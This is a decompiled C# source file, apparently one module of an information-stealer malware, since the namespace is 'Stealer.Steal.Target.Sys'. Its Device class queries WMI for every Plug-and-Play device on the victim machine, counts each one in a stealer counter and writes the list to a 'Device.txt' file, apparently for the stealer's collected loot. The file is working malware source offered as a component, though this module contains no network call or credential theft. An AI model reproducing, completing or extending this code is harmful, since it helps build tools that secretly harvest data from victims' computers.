using System;
using System.Collections.Generic;
using System.Management;
using Stealer.Steal.Helper;

namespace Stealer.Steal.Target.Sys;

internal class Device
{
	public static void Start()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_PnPEntity");
		List<string> list = new List<string> { "name\tPNPClass\tstatus\tdescription" };
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.Current;
				try
				{
					if (((ManagementBaseObject)val2)["Name"] != null)
					{
						string text = ((ManagementBaseObject)val2)["Name"].ToString();
						string text2 = ((ManagementBaseObject)val2)["Description"].ToString();
						string text3 = ((((ManagementBaseObject)val2)["Status"].ToString() == "OK") ? "Enable" : "Disable");
						string text4 = ((ManagementBaseObject)val2)["PNPClass"].ToString();
						list.Add(text + "\t" + text4 + "\t" + text3 + "\t" + text2);
						Counter.CountDevice++;
					}
				}
				catch
				{
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		if (list.Count > 1)
		{
			DynamicFiles.WriteAllText("Device.txt", string.Join("\n", (IEnumerable<string?>)list.ToArray()));
		}
	}
}
